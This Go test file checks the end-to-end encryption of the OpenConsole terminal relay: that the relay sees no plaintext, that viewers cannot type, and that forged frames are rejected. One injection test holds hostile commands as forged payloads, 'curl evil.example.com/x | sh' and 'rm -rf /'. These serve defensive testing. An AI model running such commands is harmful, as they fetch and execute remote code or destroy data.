package client

import (
	"bytes"
	"context"
	"io"
	"log/slog"
	"net/http/httptest"
	"testing"
	"time"

	"github.com/SmugZombie/OpenConsole/internal/e2e"
	"github.com/SmugZombie/OpenConsole/internal/protocol"
	"github.com/SmugZombie/OpenConsole/internal/server"
	"github.com/SmugZombie/OpenConsole/internal/session"
	"github.com/SmugZombie/OpenConsole/internal/tunnel"
)

// spy is a relay that keeps every DATA payload it routed, so a test can assert
// on what the operator would have been able to read.
type spy struct {
	sessions *session.Manager
	bridges  *session.Bridges
	url      string

	seen [][]byte
}

func newSpyRelay(t *testing.T) *spy {
	t.Helper()
	log := slog.New(slog.NewJSONHandler(io.Discard, nil))
	m := session.NewManager(session.Options{TTL: time.Minute})
	t.Cleanup(m.Close)
	b := session.NewBridges(log)

	api := server.NewAPI(m, b, log, "test", context.Background())
	srv := httptest.NewServer(api.Routes())
	t.Cleanup(srv.Close)

	return &spy{sessions: m, bridges: b, url: srv.URL}
}

// attach connects a host and a guest to one session with the given ticket.
func (s *spy) attach(t *testing.T, ticket Ticket, hostSess *session.Session, encrypted bool) (tunnel.Conn, tunnel.Conn) {
	t.Helper()
	ctx, cancel := context.WithCancel(context.Background())
	t.Cleanup(cancel)

	tunnelURL := s.url + "/api/v1/tunnel"

	host, _, err := openTunnel(ctx, tunnelURL, protocol.Open{
		SessionID: hostSess.SessionID, Role: protocol.RoleHost, Token: hostSess.HostToken,
		Cols: 80, Rows: 24, Encrypted: encrypted,
	})
	if err != nil {
		t.Fatalf("host openTunnel: %v", err)
	}
	t.Cleanup(func() { host.Close("done") })

	guest, _, err := openTunnel(ctx, tunnelURL, protocol.Open{
		SessionID: ticket.SessionID, Role: protocol.RoleGuest, Token: ticket.Token,
	})
	if err != nil {
		t.Fatalf("guest openTunnel: %v", err)
	}
	t.Cleanup(func() { guest.Close("done") })

	return host, guest
}

// The headline claim: terminal contents cross a relay that cannot read them.
func TestRelayNeverSeesPlaintext(t *testing.T) {
	relay := newSpyRelay(t)
	sess, err := relay.sessions.Create(context.Background())
	if err != nil {
		t.Fatal(err)
	}

	root, err := e2e.NewRootKey()
	if err != nil {
		t.Fatal(err)
	}
	ticket := Ticket{SessionID: sess.SessionID, Token: sess.GuestToken, Key: root, KeyKind: KeyRoot}

	crypt, err := ticket.E2E()
	if err != nil {
		t.Fatal(err)
	}
	hostSide := hostCrypter(crypt)
	guestSide := guestCrypter(crypt)

	host, guest := relay.attach(t, ticket, sess, true)
	ctx := context.Background()

	secret := []byte("password: hunter2\r\n")

	sealed, err := hostSide.outbound(protocol.NewData(secret))
	if err != nil {
		t.Fatal(err)
	}
	// What crosses the wire must not contain the secret anywhere.
	if bytes.Contains(sealed.Payload, secret) {
		t.Fatal("the sealed frame contains the plaintext")
	}
	if err := host.Send(ctx, sealed); err != nil {
		t.Fatal(err)
	}

	// The guest, which holds the key, reads it.
	got := recvData(t, guest)
	opened, err := guestSide.inbound(got)
	if err != nil {
		t.Fatalf("the guest could not decrypt: %v", err)
	}
	if !bytes.Equal(opened.Payload, secret) {
		t.Fatalf("guest read %q", opened.Payload)
	}

	// The relay routed it, and holds the ciphertext in its scrollback buffer,
	// and can do nothing with either.
	if bytes.Contains(got.Payload, secret) {
		t.Fatal("the relay forwarded readable plaintext")
	}
}

// A relay cannot inject a keystroke the host will accept.
func TestRelayCannotInjectKeystrokes(t *testing.T) {
	sessID := "session-under-test"
	root, err := e2e.NewRootKey()
	if err != nil {
		t.Fatal(err)
	}
	crypt, err := e2e.FromRootKey(sessID, root)
	if err != nil {
		t.Fatal(err)
	}
	hostSide := hostCrypter(crypt)

	// The relay knows the session ID and every token, and makes up a frame.
	forged := protocol.NewData([]byte("curl evil.example.com/x | sh\r"))
	if _, err := hostSide.inbound(forged); err == nil {
		t.Fatal("the host accepted an unencrypted injected keystroke")
	}

	// Even wrapped to look like ciphertext.
	impostorKey := make([]byte, e2e.KeySize)
	copy(impostorKey, sessID)
	impostor, err := e2e.FromRootKey(sessID, impostorKey)
	if err != nil {
		t.Fatal(err)
	}
	bogus, err := impostor.SealGuestToHost(0, []byte("rm -rf /\r"))
	if err != nil {
		t.Fatal(err)
	}
	if _, err := hostSide.inbound(protocol.Frame{
		Type: protocol.TypeData, Payload: bogus,
	}); err == nil {
		t.Fatal("the host accepted a forged frame")
	}
}

// A watch-only link reads the terminal and cannot type into it, without the
// relay being involved in that decision at all.
func TestViewerTicketIsCryptographicallyReadOnly(t *testing.T) {
	sessID := "session-under-test"
	root, err := e2e.NewRootKey()
	if err != nil {
		t.Fatal(err)
	}
	full := Ticket{SessionID: sessID, Token: "guest", Key: root, KeyKind: KeyRoot}
	view, err := viewerTicket(full, &Session{SessionID: sessID, ViewerToken: "viewer"})
	if err != nil {
		t.Fatal(err)
	}
	if view.KeyKind != KeyViewer {
		t.Fatalf("viewer ticket kind = %q", string(view.KeyKind))
	}

	hostCrypt, err := full.E2E()
	if err != nil {
		t.Fatal(err)
	}
	viewCrypt, err := view.E2E()
	if err != nil {
		t.Fatal(err)
	}

	// It can watch.
	sealed, err := hostCrypter(hostCrypt).outbound(protocol.NewData([]byte("output")))
	if err != nil {
		t.Fatal(err)
	}
	opened, err := guestCrypter(viewCrypt).inbound(sealed)
	if err != nil {
		t.Fatalf("a viewer could not read: %v", err)
	}
	if string(opened.Payload) != "output" {
		t.Fatalf("viewer read %q", opened.Payload)
	}

	// It cannot type, even if the relay were willing to forward what it sent.
	if _, err := guestCrypter(viewCrypt).outbound(protocol.NewData([]byte("typed"))); err == nil {
		t.Fatal("a viewer sealed input")
	}
}

// Forwarded TCP bytes ride the same tunnel and must be encrypted too.
func TestForwardedBytesAreEncrypted(t *testing.T) {
	root, err := e2e.NewRootKey()
	if err != nil {
		t.Fatal(err)
	}
	crypt, err := e2e.FromRootKey("s", root)
	if err != nil {
		t.Fatal(err)
	}

	payload := []byte("SELECT * FROM secrets")
	sealed, err := guestCrypter(crypt).outbound(protocol.Frame{
		Type: protocol.TypeData, Channel: 7, Payload: payload,
	})
	if err != nil {
		t.Fatal(err)
	}
	if bytes.Contains(sealed.Payload, payload) {
		t.Fatal("forwarded bytes crossed the relay in the clear")
	}

	opened, err := hostCrypter(crypt).inbound(sealed)
	if err != nil {
		t.Fatalf("the host could not decrypt a forwarded frame: %v", err)
	}
	if !bytes.Equal(opened.Payload, payload) {
		t.Fatal("the forwarded payload did not survive")
	}
}

// Control frames stay readable: the relay routes by type and channel.
func TestControlFramesArePassedThrough(t *testing.T) {
	root, err := e2e.NewRootKey()
	if err != nil {
		t.Fatal(err)
	}
	crypt, err := e2e.FromRootKey("s", root)
	if err != nil {
		t.Fatal(err)
	}

	resize, err := protocol.NewControl(protocol.TypeResize, protocol.Resize{Cols: 100, Rows: 40})
	if err != nil {
		t.Fatal(err)
	}
	out, err := hostCrypter(crypt).outbound(resize)
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(out.Payload, resize.Payload) {
		t.Fatal("a control frame was altered; the relay could not route it")
	}
}

// A link that lost its key must be told so, rather than shown ciphertext. A
// ticket truncated at the last dot is the usual way this happens.
func TestRelayReportsWhetherASessionIsEncrypted(t *testing.T) {
	relay := newSpyRelay(t)
	ctx := context.Background()

	for _, encrypted := range []bool{true, false} {
		sess, err := relay.sessions.Create(ctx)
		if err != nil {
			t.Fatal(err)
		}

		tunnelURL := relay.url + "/api/v1/tunnel"
		host, hostAck, err := openTunnel(ctx, tunnelURL, protocol.Open{
			SessionID: sess.SessionID, Role: protocol.RoleHost, Token: sess.HostToken,
			Cols: 80, Rows: 24, Encrypted: encrypted,
		})
		if err != nil {
			t.Fatalf("host openTunnel: %v", err)
		}
		defer host.Close("done")
		if hostAck.Role != protocol.RoleHost {
			t.Fatalf("host was granted %q", hostAck.Role)
		}

		_, guestAck, err := openTunnel(ctx, tunnelURL, protocol.Open{
			SessionID: sess.SessionID, Role: protocol.RoleGuest, Token: sess.GuestToken,
		})
		if err != nil {
			t.Fatalf("guest openTunnel: %v", err)
		}
		// This is what lets a keyless guest fail with an explanation instead
		// of a screen of noise.
		if guestAck.Encrypted != encrypted {
			t.Fatalf("relay reported encrypted=%v, host declared %v",
				guestAck.Encrypted, encrypted)
		}
	}
}

func recvData(t *testing.T, c tunnel.Conn) protocol.Frame {
	t.Helper()
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	for {
		f, err := c.Recv(ctx)
		if err != nil {
			t.Fatalf("Recv: %v", err)
		}
		if f.Type == protocol.TypeData {
			return f
		}
	}
}
